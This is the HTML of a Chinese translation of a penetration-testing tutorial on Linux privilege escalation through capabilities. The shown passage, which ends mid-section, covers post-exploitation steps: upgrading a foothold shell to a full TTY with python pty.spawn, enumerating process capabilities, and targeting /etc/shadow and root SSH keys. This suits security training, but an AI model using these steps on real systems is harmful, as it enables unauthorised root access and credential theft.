<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-Capabilities" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-Capabilities | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Capabilities"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-Capabilities | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Capabilities – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Capabilities – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Capabilities"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Capabilities" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Capabilities" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed"><link rel="stylesheet" href="/web/assets/css/styles.b7abb307.css">
<script src="/web/assets/js/runtime~main.53f73fdc.js" defer="defer"></script>
<script src="/web/assets/js/main.fc57339d.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/category/️渗透">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="搜索" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities">Linux 提权-Capabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs">Linux 提权-Cron Jobs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器">Linux 提权-Docker 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器">Linux 提权-LXD 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF">Linux 提权-MySQL UDF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享">Linux 提权-NFS 共享</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1">Linux 提权-SUID_SGID_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2">Linux 提权-SUID_SGID_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1">Linux 提权-Sudo_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2">Linux 提权-Sudo_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用">Linux 提权-内核利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权指南">Linux 提权指南</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/gpt-问答">🤖GPT 问答</a><button aria-label="展开侧边栏分类 &#x27;🤖GPT 问答&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-Capabilities</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-Capabilities</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/capabilities/" target="_blank" rel="noopener noreferrer">Capabilities – Linux Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 什么是 Capabilities ?</a></li>
<li><a href="#id2">2 枚举 Capabilities</a>
<ul>
<li><a href="#id2.1">2.1 枚举 Capabilities - 手动方法</a>
<ul>
<li><a href="#id2.1.1">2.1.1 进程 Capabilities</a></li>
<li><a href="#id2.1.2">2.1.2 服务 Capabilities</a></li>
<li><a href="#id2.1.3">2.1.3 用户 Capabilities</a></li>
<li><a href="#id2.1.4">2.1.4 二进制 Capabilities</a></li>
</ul>
</li>
<li><a href="#id2.2">2.2 枚举 Capabilities – LinPEAS 方法</a></li>
</ul>
</li>
<li><a href="#id3">3 利用各种 Capabilities</a>
<ul>
<li><a href="#id3.1">3.1 cap_dac_read_search</a>
<ul>
<li><a href="#id3.1.1">3.1.1 cap_dac_read_search – gdb</a></li>
<li><a href="#id3.1.2">3.1.2 cap_dac_read_search – perl</a></li>
<li><a href="#id3.1.3">3.1.3 cap_dac_read_search – tar</a></li>
<li><a href="#id3.1.4">3.1.4 cap_dac_read_search – vim</a></li>
</ul>
</li>
<li><a href="#id3.2">3.2 cap_dac_override</a>
<ul>
<li><a href="#id3.2.1">3.2.1 cap_dac_override – python3</a></li>
<li><a href="#id3.2.2">3.2.2 cap_dac_override – vim</a></li>
</ul>
</li>
<li><a href="#id3.3">3.3 cap_chown</a>
<ul>
<li><a href="#id3.3.1">3.3.1 cap_chown – perl</a></li>
<li><a href="#id3.3.2">3.3.2 cap_chown – python3</a></li>
</ul>
</li>
<li><a href="#id3.4">3.4 cap_fowner</a>
<ul>
<li><a href="#id3.4.1">3.4.1 cap_fowner – python3</a></li>
</ul>
</li>
<li><a href="#id3.5">3.5 cap_setuid</a>
<ul>
<li><a href="#id3.5.1">3.5.1 cap_setuid – perl</a></li>
<li><a href="#id3.5.2">3.5.2 cap_setuid – python3</a></li>
</ul>
</li>
<li><a href="#id3.6">3.6 cap_setgid</a>
<ul>
<li><a href="#id3.6.1">3.6.1 cap_setgid – python3</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id4">4 最后的想法</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将深入探讨如何利用各种 Capabilities。具体来说，我们将看到攻击者如何利用六种不同的 Capabilities 来提升用户权限到 root 权限。</p>
<p>我们将使用手动方法和工具方法分别枚举 capabilities，一旦我们获得了可能被利用的 capabilities 列表，我们将逐一介绍如何利用它们。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1什么是-capabilities-"><strong><div id="id1">1、什么是 Capabilities ？</div></strong><a href="#1什么是-capabilities-" class="hash-link" aria-label="1什么是-capabilities-的直接链接" title="1什么是-capabilities-的直接链接">​</a></h2>
<p>Capabilities 是一种特殊属性，可提供通常为 root 级操作保留的特定（提升）权限。capabilities 的工作原理是将 root 权限分解为更小且独特的单元，这些单元可分配给进程、二进制文件、服务和用户。如果 capabilities 设置得过于宽松，或当 capabilities设置在“允许文件读取、文件写入或命令执行”的二进制文件上时，攻击者就可以将其权限提升至 root。</p>
<p>作为攻击者，当我们看到设置的 capabilites 时，我们需要考虑正在使用哪种功能？；该功能设置在什么位置？；以及，我们可以用此功能做什么？如果没有设置此功能，我们无法做什么？</p>
<p>例如，假设我们设置了一项 capabilites ，它允许文本编辑器命令（vim、nano 等）读取特权文件。那么，我们知道我们可以读取文件系统上的任何文件。这意味着我们可以查看敏感文件，如配置文件、/etc/shadow 文件，或者可能是 /root/.ssh 目录中的 id_rsa 文件。选项无穷无尽；但是，我们需要了解在具有这种功能的 Linux 系统上需要注意什么或什么是 &quot;敏感 &quot;的。</p>
<blockquote>
<p>有关所有不同 Linux Capabilites的列表，请看[man](<a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noopener noreferrer">capabilities(7) - Linux manual page</a>)手册。此外，您还可以访问<a href="https://linux-audit.com/linux-capabilities-101/" target="_blank" rel="noopener noreferrer">本页面</a>，以更全面地了解什么是功能及其工作原理。最后，HackTricks 有关Capabilites 的页面也是令人难以置信的，所以我也要把它<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#linux-capabilities" target="_blank" rel="noopener noreferrer">链接</a>到这里。</p>
</blockquote>
<p>Linux 中有许多不同的 capabilities。例如，Ubuntu 16.04 上有 37 种功能，新版本中可能更多；然而，在本文中，我们将仅介绍其中较危险的 6 种功能。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2枚举-capabilities"><strong><div id="id2">2、枚举 Capabilities</div></strong><a href="#2枚举-capabilities" class="hash-link" aria-label="2枚举-capabilities的直接链接" title="2枚举-capabilities的直接链接">​</a></h2>
<p>在这个例子中，我们作为标准用户“Juggernaut”在 Linux（Ubuntu 16.04）目标上获得了立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304490-1395881961-2405faf146a46dcc4f066ba2389b862b.png" width="495" height="130" class="img_ev3q"></p>
<p>由于此 shell 不是使用 SSH 创建的，因此在获得立足点后，我们要做的第一件事就是将 shell 升级为完整 TTY（如果可以的话）。我们可以使用以下命令集执行此操作：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CTRL + Z </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stty raw -echo;fg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export TERM=xterm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304976-1250383648-9b559547e4b9c380ec4cce137c52251e.png" width="581" height="174" class="img_ev3q"></p>
<p>现在我们有了完整的 TTY，我们可以使用箭头浏览命令历史记录、使用制表符补全、清除终端等等。</p>
<blockquote>
<p>对于我们来说，完成上述步骤非常重要，因为我们将使用一些需要在完整 TTY 环境下进行交互的二进制命令。</p>
</blockquote>
<p>完成这一步之后，我们就可以开始专注于枚举了。首先，我们将了解如何使用手动方法枚举 capabilities，然后我们将使用 LinPEAS 自动为我们找到所有相同的信息。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21枚举-capabilities---手动方法"><strong><div id="id2.1">2.1、枚举 Capabilities - 手动方法</div></strong><a href="#21枚举-capabilities---手动方法" class="hash-link" aria-label="21枚举-capabilities---手动方法的直接链接" title="21枚举-capabilities---手动方法的直接链接">​</a></h4>
<p>由于进程、二进制文件、服务和用户都可以设置 capabilities，因此有一些不同的命令以及不同的位置可以查找有关设置了哪些 capabilities 的信息。</p>
<p>在这篇文章中我们将重点关注二进制 capabilities，但也让我们快速了解一下如何定位其他类型【即进程、服务、用户】的 capabilities 。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="211进程-capabilities"><strong><div id="id2.1.1">2.1.1、进程 Capabilities</div></strong><a href="#211进程-capabilities" class="hash-link" aria-label="211进程-capabilities的直接链接" title="211进程-capabilities的直接链接">​</a></h6>
<p>要查找正在运行的进程的 capabilities，我们首先需要确定我们感兴趣的进程。我们可以使用以下命令执行此操作：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ps -ef</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>找到感兴趣的进程后，记下 PID；例如，如果 PID 为 6306，则运行以下命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /proc/6306/status | grep Cap</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304243-422070126-abbd9d61dbe9eadb2596c16df9153bd7.png" width="569" height="135" class="img_ev3q"></p>
<p>我们可以看到它打印了五种类型的 capabilities：</p>
<ul>
<li>CapInh = 继承</li>
<li>CapPrm = 允许</li>
<li>CapEff = 有效</li>
<li>CapBnd = 边界集</li>
<li>CapAmb = 环境集</li>
</ul>
<p>然后我们可以解码这些来查看该进程有什么（重点是 CapPrm）：</p>
